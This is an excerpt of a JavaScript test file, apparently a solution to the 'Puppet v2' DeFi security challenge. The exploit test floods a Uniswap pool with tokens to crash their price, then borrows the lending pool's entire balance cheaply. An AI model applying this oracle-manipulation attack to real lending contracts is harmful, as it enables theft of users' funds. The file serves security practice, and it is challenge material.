...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    //Set up contract transactions from attacker address
    ...
    //Approve uniswap router contract to use attacker token balance before querying for swap
    await attackToken.approve(
      this.uniswapRouter.address,
      ATTACKER_INITIAL_TOKEN_BALANCE
    )

    //Devalue token value in correspondence with WETH by flooding uniswap router with attacker tokens
    await attackUniswap.swapExactTokensForETH(
      ATTACKER_INITIAL_TOKEN_BALANCE,
    ...
    //Confirm attacker WETH Balance
    console.log(
      "Attackers eth balance",
    ...
    //Convert ETH to WETH and approve lending pool to acquire
    //Borrow the amount and attack completed
    await attackWeth.deposit({ value: collateral })

    await attackWeth.approve(this.lendingPool.address, collateral)

    await attackLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE)
  })
